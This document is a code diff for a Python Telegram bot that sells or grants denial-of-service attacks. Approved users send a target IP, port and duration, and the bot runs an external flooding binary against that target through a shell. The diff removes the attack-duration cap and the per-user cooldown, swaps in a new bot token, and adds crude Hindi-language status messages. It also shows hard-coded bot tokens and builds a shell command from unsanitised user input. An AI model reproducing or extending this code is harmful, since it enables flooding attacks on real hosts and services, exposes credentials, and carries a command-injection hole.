@@ -1,21 +1,14 @@
 import asyncio
-import time
 from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
 import os
 
 # Configuration
-TELEGRAM_BOT_TOKEN = ("7819992909:AAHfbmckp2vxVRCmu9hhFq42q_hWZfvu1HM")  # Fetch token from environment variable
+TELEGRAM_BOT_TOKEN = ("8016978575:AAGtZq2YIQKIdUuDsx-tb8APm5_SPystyTs")  # Fetch token from environment variable
 ADMIN_USER_ID = 1662672529
 APPROVED_IDS_FILE = 'approved_ids.txt'
-CHANNEL_ID = "@jsbananannanan"  # Replace with your channel username
-
-# Global cooldown and attack limits
+CHANNEL_ID = "@gosjsisnsnsnsjan"  # Replace with your channel username
 attack_in_progress = False
-last_attack_time = {}
-
-# Constants
-MAX_ATTACK_TIME = 150  # 150 seconds limit on attack time
 
 # Check if the token is set
 if not TELEGRAM_BOT_TOKEN:
@@ -148,28 +141,14 @@ async def attack(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
     args = context.args
 
-    # Check if the user has already launched an attack in the past 150 seconds
-    current_time = time.time()
-    if user_id in last_attack_time and current_time - last_attack_time[user_id] < MAX_ATTACK_TIME:
-        wait_time = MAX_ATTACK_TIME - (current_time - last_attack_time[user_id])
-        await context.bot.send_message(
-            chat_id=chat_id,
-            text=f"*⚠️ You must wait {int(wait_time)} more seconds before starting another attack.*",
-            parse_mode='Markdown'
-        )
-        return
-
-    # Validate if the user is approved
     if str(chat_id) not in approved_ids and str(user_id) not in approved_ids:
         await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need permission to use this bot.*", parse_mode='Markdown')
         return
 
-    # Validate if the user is a member of the channel
     if not await is_member_of_channel(user_id, context):
         await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ You must join our channel ({CHANNEL_ID}) to use this feature.*", parse_mode='Markdown')
         return
 
-    # Check if attack is already in progress
     if attack_in_progress:
         await context.bot.send_message(chat_id=chat_id, text="*⚠️ Please wait for the current attack to finish.*", parse_mode='Markdown')
         return
@@ -179,71 +158,40 @@ async def attack(update: Update, context: CallbackContext):
         return
 
     ip, port, time = args
+    await context.bot.send_message(chat_id=chat_id, text=(
+        f"*✅ ATTACK LAG GAYA ANDHAA HAI KYA LAUDE✅*\n\n"
+        f"*🎯 TARGET CHUT:* {ip}\n"
+        f"*🔌 LAND KHADA HAI:* {port}\n"
+        f"*⏱ NIKAL GAYA KYA:* {time} seconds\n"
+    ), parse_mode='Markdown')
 
-    try:
-        # Limit attack time to 150 seconds
-        attack_duration = min(int(time), MAX_ATTACK_TIME)
+    asyncio.create_task(run_attack(chat_id, ip, port, time, context))
 
-        # Send start attack message with updated format
-        await context.bot.send_message(
-            chat_id=chat_id,
-            text=(
-                f"*🔥 ATTACK INITIATED 🔥*\n\n"
-                f"*🎯 TARGET IP:* {ip}\n"
-                f"*🔌 PORT:* {port}\n"
-                f"*⏱ DURATION:* {attack_duration} seconds\n\n"
-                "*Stand by as the attack is in progress...*"
-            ),
-            parse_mode='Markdown'
-        )
-
-        # Set last attack time to enforce cooldown
-        last_attack_time[user_id] = current_time
-
-        # Simulate running the attack
-        await run_attack(chat_id, ip, port, attack_duration, context)
-
-    except ValueError:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid duration. Please provide a number for time.*", parse_mode='Markdown')
-
-
-async def run_attack(chat_id, ip, port, duration, context):
+async def run_attack(chat_id, ip, port, time, context):
     """Simulate an attack process."""
     global attack_in_progress
     attack_in_progress = True
 
     try:
-        # Simulate the attack process
         process = await asyncio.create_subprocess_shell(
-            f"./bgmi {ip} {port} {duration} 500",  # Example subprocess (replace with real attack)
+            f"./megoxer {ip} {port} {time}",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
         stdout, stderr = await process.communicate()
 
-        # Print attack output to console (for logging purposes)
         if stdout:
             print(f"[stdout]\n{stdout.decode()}")
         if stderr:
             print(f"[stderr]\n{stderr.decode()}")
-
-        # Attack finished message
-        await context.bot.send_message(
-            chat_id=chat_id,
-            text=(
-                "*🔥 ATTACK COMPLETED 🔥*\n\n"
-                "*✅ The target has been successfully hit!* 🎯\n"
-                "*⏱ Duration: {duration} seconds*\n\n"
-                "*Thank you for using our service! Please share your feedback.*"
-            ),
-            parse_mode='Markdown'
-        )
 
     except Exception as e:
         await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
 
     finally:
         attack_in_progress = False
+        await context.bot.send_message(chat_id=chat_id, text="*♥️ CHUDAYI KHATAM HO GAYA  ♥️*\n"
+        "*FEEDBACK SEND KAR LAUDE*", parse_mode='Markdown')
 
 # Main Function
 def main():
